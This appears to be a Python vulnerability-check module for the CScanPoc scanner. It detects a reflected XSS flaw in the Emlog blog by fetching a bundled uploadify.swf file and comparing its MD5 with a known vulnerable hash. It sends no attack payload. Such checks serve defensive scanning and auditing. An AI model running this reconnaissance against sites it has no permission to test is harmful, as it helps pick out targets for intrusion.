# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import hashlib
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Emlog_0008'  # 平台漏洞编号，留空
    name = 'Emlog博客前台反射型XSS(无视浏览器filter)'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-10-26'  # 漏洞公布时间
    desc = '''
        Emlog博客前台反射型XSS(无视浏览器filter)
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=69818'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Emlog'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'af23155f-faa5-4a70-bf60-3f12c65c73ce'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
            payload = "/include/lib/js/uploadify/uploadify.swf"
            url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(url)

            if code == 200:
                md5_value = hashlib.md5(res).hexdigest()
                if md5_value in flash_md5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
